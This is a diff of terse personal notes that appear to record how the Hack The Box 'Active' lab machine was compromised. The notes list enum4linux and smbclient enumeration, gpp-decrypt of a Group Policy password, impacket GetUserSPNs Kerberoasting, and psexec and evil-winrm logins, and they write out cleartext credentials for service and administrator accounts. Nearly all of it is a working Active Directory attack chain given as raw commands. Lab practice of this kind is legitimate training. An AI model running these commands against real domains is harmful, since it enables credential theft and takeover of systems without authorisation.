@@ -1,1 +1,28 @@
+
 enum4linux -U -o 192.168.5.27
+
+Scanning AD Server with smbclient:
+{
+  smbclient -H 10.10.10.100
+=> Folder with Read and Write.
+
+cd \active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
+get group.xml
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ > password.txt
+cat password.txt
+
+Get-ADUsers.py -all active.htb/svg_tgs -dc-ip <IP>
+
+smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18
+
+GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
+
+impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
+--format=krb5tgs
+
+psexec.py active.htb/Administrator:Ticketmaster1968@active.htb
+evil-winrm -i 10.10.31.230 -u sage -p 'r33ntHEphgK2&V'
+
+
+
+}
